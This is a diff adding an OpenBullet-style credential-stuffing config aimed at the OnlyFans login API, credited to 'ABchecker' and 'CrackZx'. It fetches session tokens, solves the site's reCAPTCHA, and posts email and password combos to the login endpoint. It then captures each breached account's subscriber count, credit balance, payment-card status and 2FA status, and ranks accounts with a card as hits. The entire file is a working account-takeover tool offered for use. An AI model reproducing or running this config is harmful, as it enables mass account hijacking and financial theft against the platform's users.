@@ -1,0 +1,175 @@
+[SETTINGS]
+{
+  "Name": "OnlyFans",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-03-19T01:08:32.0712701+04:30",
+  "AdditionalInfo": "",
+  "Author": "Brandon",
+  "Version": "1.3.1 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#@ABchecker REQUEST GET "https://onlyfans.com/api2/v2/users/login" ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "app-token: 33d57ade8c02dbc5a333db99ff9ae26a" 
+
+#@ABchecker KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+#@ABchecker PARSE "<HEADERS(X-OF-REV)>" LR "" "" -> VAR "xod" 
+
+#@ABchecker FUNCTION Hash SHA1 "<xod>" -> VAR "shashed" 
+
+#R@ABchecker REQUEST GET "https://onlyfans.com/api2/v2/init" ReadResponseSource=FALSE 
+  
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "app-token: 33d57ade8c02dbc5a333db99ff9ae26a" 
+  HEADER "referer: https://onlyfans.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sign: 61:87237d98881c0307c0fb42f2591a886de78d7204:784:60cb4202" 
+  HEADER "time: 1624010873822" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36" 
+  HEADER "x-bc: <shashed>" 
+
+#@ABchecker PARSE "<COOKIES(csrf)>" LR "" "" -> VAR "csrf" 
+
+#@ABchecker PARSE "<COOKIES(sess)>" LR "" "" -> VAR "sess" 
+
+#@ABchecker KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" NotEqualTo "200" 
+    KEY "<csrf>" EqualTo "" 
+
+SOLVECAPTCHA ReCaptchaV2 "6LfVUxkUAAAAAFwy-qwWGqKNhT1vqmYF-9ULPAWz" "https://onlyfans.com" 
+
+#@ABchecker FUNCTION Length "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"v3-recaptcha-response\":\"\",\"g-recaptcha-response\":\"<SOLUTION>\"}" -> VAR "len" 
+
+#@ABchecker REQUEST POST "https://onlyfans.com/api2/v2/users/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"v3-recaptcha-response\":\"\",\"g-recaptcha-response\":\"<SOLUTION>\"}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "csrf: <csrf>" 
+  COOKIE "sess: <sess>" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "app-token: 33d57ade8c02dbc5a333db99ff9ae26a" 
+  HEADER "content-length: <len>" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://onlyfans.com" 
+  HEADER "referer: https://onlyfans.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sign: 61:4945a3849f2c047b1288b26b510a51299ed90f13:73a:60cb4202" 
+  HEADER "time: 1624010908788" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36" 
+  HEADER "x-bc: <shashed>" 
+
+#@ABchecker KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"Wrong email or password\"" 
+    KEY "Email is not valid" 
+  KEYCHAIN Success OR 
+    KEY "{\"accessToken\":\"" 
+    KEY "\"userId\"" 
+  KEYCHAIN Ban OR 
+    KEY "\"Access denied.\"" 
+    KEY "\"Captcha wrong\"" 
+    KEY "code\":102" 
+
+#@ABchecker PARSE "<SOURCE>" JSON "userId" -> VAR "uid" 
+
+#@ABchecker REQUEST GET "https://onlyfans.com/api2/v2/users/me" 
+  
+  COOKIE "csrf: <csrf>" 
+  COOKIE "auth_id: <uid>" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "app-token: 33d57ade8c02dbc5a333db99ff9ae26a" 
+  HEADER "referer: https://onlyfans.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sign: 61:1a250d4c8c6a0ff65cbd7a6aa6c8edbc06d4da08:92d:60cb4202" 
+  HEADER "time: 1624010958706" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36" 
+  HEADER "x-bc: <shashed>" 
+
+#@ABchecker KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Access denied" 
+
+#@ABchecker PARSE "<SOURCE>" LR "subscribesCount\":" "," CreateEmpty=FALSE -> CAP "Subscribers" 
+
+#@ABchecker PARSE "<SOURCE>" LR "creditBalance\":" "," CreateEmpty=FALSE -> CAP "Balance" 
+
+#@ABchecker PARSE "<SOURCE>" LR "isPaymentCardConnected\":" "," CreateEmpty=FALSE -> CAP "Card" 
+
+#@ABchecker PARSE "<SOURCE>" JSON "isOtpEnabled" CreateEmpty=FALSE -> CAP "2FA" 
+
+#@ABchecker PARSE "<SOURCE>" JSON "isSpotifyConnected" CreateEmpty=FALSE -> CAP "isSpotifyConnected" 
+
+#@ABchecker KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Card>" EqualTo "false" 
+  KEYCHAIN Success OR 
+    KEY "<Card>" Contains "true" 
+
+#@ABchecker FUNCTION Constant "@ABchecker  @CrackZx" -> CAP "make by " 
+
